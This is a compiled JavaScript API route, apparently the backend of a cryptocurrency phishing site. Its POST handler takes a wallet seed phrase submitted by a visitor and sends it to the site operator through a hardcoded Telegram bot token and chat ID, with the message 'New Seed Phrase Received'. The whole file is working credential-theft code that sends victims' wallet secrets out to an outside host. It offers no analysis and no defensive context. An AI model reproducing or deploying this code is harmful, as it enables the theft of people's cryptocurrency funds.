globalThis.process ??= {}; globalThis.process.env ??= {};
export { renderers } from '../../renderers.mjs';

const POST = async ({ request }) => {
  try {
    const body = await request.json();
    const { seedPhrase } = body;
    if (!seedPhrase) {
      return new Response(
        JSON.stringify({ error: "Seed phrase is required" }),
        { status: 400, headers: { "Content-Type": "application/json" } }
      );
    }
    const botToken = "7752450813:AAE7V3M-x8aIYz9Wq4n8dyBQkNknp_XvsMg";
    const chatId = "1003374046424";
    if (!botToken || !chatId) ;
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const message = `🔑 New Seed Phrase Received:

${seedPhrase}`;
    const response = await fetch(telegramApiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });
    if (!response.ok) {
      const errorData = await response.text();
      console.error("Telegram API error:", errorData);
      return new Response(
        JSON.stringify({ error: "Failed to send to Telegram" }),
        { status: 502, headers: { "Content-Type": "application/json" } }
      );
    }
    return new Response(
      JSON.stringify({ success: true }),
      { status: 200, headers: { "Content-Type": "application/json" } }
    );
  } catch (error) {
    console.error("Error in send-seed API:", error);
    return new Response(
      JSON.stringify({ error: "Internal server error" }),
      { status: 500, headers: { "Content-Type": "application/json" } }
    );
  }
};

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  POST
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
